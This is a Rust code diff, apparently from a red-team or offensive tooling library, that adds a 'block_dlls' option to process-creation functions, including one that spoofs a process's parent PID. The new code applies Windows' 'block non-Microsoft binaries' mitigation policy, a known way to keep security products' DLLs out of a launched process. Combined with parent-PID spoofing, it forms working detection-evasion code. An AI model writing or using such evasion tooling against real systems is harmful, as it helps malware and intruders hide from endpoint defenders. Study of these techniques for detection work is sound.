@@ -1837,7 +1837,12 @@ pub fn free_memory(pid: u32, allocation_base: usize) -> Result<(), MiscError> {
 /// * `exe_path` - Path to the executable
 /// * `args` - Command line arguments (can be empty)
 /// * `suspended` - If true, creates the process in a suspended state
-pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u32, u32), MiscError> {
+/// * `block_dlls` - If true, blocks non-Microsoft signed DLLs from being loaded
+pub fn create_process(exe_path: &str, args: &str, suspended: bool, block_dlls: bool) -> Result<(u32, u32), MiscError> {
+    const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007;
+    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 =
+        0x0000_1000_0000_0000;
+
     // Validate executable exists
     if !Path::new(exe_path).exists() {
         return Err(MiscError::FileNotFound(exe_path.to_string()));
@@ -1854,31 +1859,109 @@ pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u3
     let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
 
     unsafe {
-        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
-        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-
         let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
 
-        let creation_flags = if suspended { CREATE_SUSPENDED } else { Default::default() };
+        if block_dlls {
+            // Use STARTUPINFOEXW with mitigation policy attribute
+            let mut attr_size: usize = 0;
+            let _ = InitializeProcThreadAttributeList(
+                LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
+                1,
+                0,
+                &mut attr_size,
+            );
 
-        let result = CreateProcessW(
-            None,                           // lpApplicationName
-            windows::core::PWSTR(cmd_wide.as_mut_ptr()), // lpCommandLine
-            None,                           // lpProcessAttributes
-            None,                           // lpThreadAttributes
-            false,                          // bInheritHandles
-            creation_flags,                 // dwCreationFlags
-            None,                           // lpEnvironment
-            None,                           // lpCurrentDirectory
-            &startup_info,                  // lpStartupInfo
-            &mut process_info,              // lpProcessInformation
-        );
+            if attr_size == 0 {
+                return Err(MiscError::CreateProcessFailed(
+                    "InitializeProcThreadAttributeList returned zero size".to_string(),
+                ));
+            }
 
-        if result.is_err() {
-            return Err(MiscError::CreateProcessFailed(format!(
-                "CreateProcessW failed for {}",
-                exe_path
-            )));
+            let mut attr_buf = vec![0u8; attr_size];
+            let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);
+
+            if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size).is_err() {
+                return Err(MiscError::CreateProcessFailed(
+                    "InitializeProcThreadAttributeList failed".to_string(),
+                ));
+            }
+
+            let mut policy: u64 =
+                PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+            if UpdateProcThreadAttribute(
+                attr_list,
+                0,
+                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                Some(&mut policy as *mut _ as *const std::ffi::c_void),
+                std::mem::size_of::<u64>(),
+                None,
+                None,
+            )
+            .is_err()
+            {
+                DeleteProcThreadAttributeList(attr_list);
+                return Err(MiscError::CreateProcessFailed(
+                    "UpdateProcThreadAttribute for BlockDllPolicy failed".to_string(),
+                ));
+            }
+
+            let mut startup_info_ex: STARTUPINFOEXW = std::mem::zeroed();
+            startup_info_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+            startup_info_ex.lpAttributeList = attr_list;
+
+            let mut creation_flags = EXTENDED_STARTUPINFO_PRESENT;
+            if suspended {
+                creation_flags |= CREATE_SUSPENDED;
+            }
+
+            let result = CreateProcessW(
+                None,
+                windows::core::PWSTR(cmd_wide.as_mut_ptr()),
+                None,
+                None,
+                false,
+                creation_flags,
+                None,
+                None,
+                &startup_info_ex.StartupInfo,
+                &mut process_info,
+            );
+
+            DeleteProcThreadAttributeList(attr_list);
+
+            if result.is_err() {
+                return Err(MiscError::CreateProcessFailed(format!(
+                    "CreateProcessW with BlockDllPolicy failed for {}",
+                    exe_path
+                )));
+            }
+        } else {
+            // Simple path without extended attributes
+            let mut startup_info: STARTUPINFOW = std::mem::zeroed();
+            startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+
+            let creation_flags = if suspended { CREATE_SUSPENDED } else { Default::default() };
+
+            let result = CreateProcessW(
+                None,
+                windows::core::PWSTR(cmd_wide.as_mut_ptr()),
+                None,
+                None,
+                false,
+                creation_flags,
+                None,
+                None,
+                &startup_info,
+                &mut process_info,
+            );
+
+            if result.is_err() {
+                return Err(MiscError::CreateProcessFailed(format!(
+                    "CreateProcessW failed for {}",
+                    exe_path
+                )));
+            }
         }
 
         let pid = process_info.dwProcessId;
@@ -1904,13 +1987,18 @@ pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u3
 /// * `exe_path` - Path to the executable to launch
 /// * `args` - Command line arguments (can be empty)
 /// * `suspended` - Whether to create the process in a suspended state
+/// * `block_dlls` - If true, also blocks non-Microsoft signed DLLs from being loaded
 pub fn create_ppid_spoofed_process(
     parent_pid: u32,
     exe_path: &str,
     args: &str,
     suspended: bool,
+    block_dlls: bool,
 ) -> Result<(u32, u32), MiscError> {
     const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
+    const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007;
+    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 =
+        0x0000_1000_0000_0000;
 
     // Validate executable exists
     if !Path::new(exe_path).exists() {
@@ -1926,6 +2014,8 @@ pub fn create_ppid_spoofed_process(
 
     let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
 
+    let attr_count: u32 = if block_dlls { 2 } else { 1 };
+
     unsafe {
         // Open handle to the parent process
         let h_parent = OpenProcess(PROCESS_ALL_ACCESS, false, parent_pid)
@@ -1935,7 +2025,7 @@ pub fn create_ppid_spoofed_process(
         let mut attr_size: usize = 0;
         let _ = InitializeProcThreadAttributeList(
             LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
-            1,
+            attr_count,
             0,
             &mut attr_size,
         );
@@ -1952,7 +2042,7 @@ pub fn create_ppid_spoofed_process(
         let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);
 
         // Initialize the attribute list
-        if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size).is_err() {
+        if InitializeProcThreadAttributeList(attr_list, attr_count, 0, &mut attr_size).is_err() {
             let _ = CloseHandle(h_parent);
             return Err(MiscError::PPidSpoofFailed(
                 "InitializeProcThreadAttributeList failed".to_string(),
@@ -1975,8 +2065,31 @@ pub fn create_ppid_spoofed_process(
             DeleteProcThreadAttributeList(attr_list);
             let _ = CloseHandle(h_parent);
             return Err(MiscError::PPidSpoofFailed(
-                "UpdateProcThreadAttribute failed".to_string(),
+                "UpdateProcThreadAttribute for parent process failed".to_string(),
             ));
+        }
+
+        // Optionally set the block DLL policy attribute
+        let mut policy: u64 =
+            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+        if block_dlls {
+            if UpdateProcThreadAttribute(
+                attr_list,
+                0,
+                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                Some(&mut policy as *mut _ as *const std::ffi::c_void),
+                std::mem::size_of::<u64>(),
+                None,
+                None,
+            )
+            .is_err()
+            {
+                DeleteProcThreadAttributeList(attr_list);
+                let _ = CloseHandle(h_parent);
+                return Err(MiscError::PPidSpoofFailed(
+                    "UpdateProcThreadAttribute for BlockDllPolicy failed".to_string(),
+                ));
+            }
         }
 
         // Set up STARTUPINFOEXW with the attribute list
